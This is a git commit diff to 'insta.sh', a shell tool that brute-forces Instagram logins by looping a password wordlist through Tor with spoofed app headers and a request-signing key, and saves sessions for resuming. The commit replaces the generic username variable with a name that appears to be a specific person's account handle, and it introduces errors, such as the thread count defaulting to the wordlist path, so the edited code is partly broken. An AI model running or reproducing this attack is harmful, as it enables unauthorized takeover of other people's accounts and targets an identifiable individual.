48fcf4e58fbc148f6ce4f2174b6c01bf5f85cdad
binuhp7 <binuhp7@gmail.com>
2025-10-31 19:50:12 +0530

    Update insta.sh

--- insta.sh
+++ insta.sh
@@ -66,8 +66,8 @@ function start() {
 banner
 checkroot
 dependencies
-read -p $'\e[1;92m 📝 Enter The Username For The Account: \e[0m' user
-checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "The User May Have Been Banned Or Page Being Deleted/Non-Exsistance/No User (With this username)")
+read -p $'\e[1;92m 📝 Enter The Username For The Account: \e[0m' cristal_me010
+checkaccount=$(curl -s https://www.instagram.com/$cristal_me010/?__a=1 | grep -c "The User May Have Been Banned Or Page Being Deleted/Non-Exsistance/No User (cristal_me010)")
 if [[ "$checkaccount" == 1 ]]; then
 printf "\e[1;91m ❌ Invalid Username Entered! Try Again\e[0m\n"
 sleep 1
@@ -78,7 +78,7 @@ read -p $'\e[1;92m 📃 Enter The name Of Custom Password List (Press Enter For 
 wl_pass="${wl_pass:-${default_wl_pass}}"
 default_threads="15"
 read -p $'\e[1;92m 🔗 Threads To Use While Testing Passwords: (Always Use < 20, Default-15): \e[0m' threads
-threads="${threads:-${default_threads}}"
+threads="${threads:-${default_wl_pass}}"
 fi
 }
 
@@ -103,14 +103,14 @@ else
 sleep 3
 fi
 default_session="Y"
-printf "\n\e[1;77m 📲 Save session for user \e[0m\e[1;92m %s \e[0m" $user
+printf "\n\e[1;77m 📲 Save session for user \e[0m\e[1;92m %s \e[0m" $cristal_me010
 read -p $'\e[1;77m? ❓ [Y/n]: \e[0m' session
 session="${session:-${default_session}}"
 if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
 if [[ ! -d sessions ]]; then
 mkdir sessions
 fi
-printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > sessions/store.session.$user.$(date +"%FT%H%M")
+printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > sessions/store.session.$cristal_me010.$(date +"31-10-2025")
 printf "\e[1;77m ✔️ Session saved.\e[0m\n"
 printf "\e[1;92m Use ./instashell --resume\n"
 else
@@ -133,7 +133,7 @@ function bruteforcer() {
 
 checktor
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
-printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
+printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $cristal_me010
 printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
 printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 
@@ -184,7 +184,7 @@ default_threads="10"
 read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
 threads="${threads:-${default_threads}}"
 
-printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
+printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $cristal_me010
 printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
 printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
@@ -194,7 +194,7 @@ IFS=$'\n'
 for pass in $(sed -n '/'$pass'/,'$startline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
-data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
+data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$cristal_me010'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
 
 countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
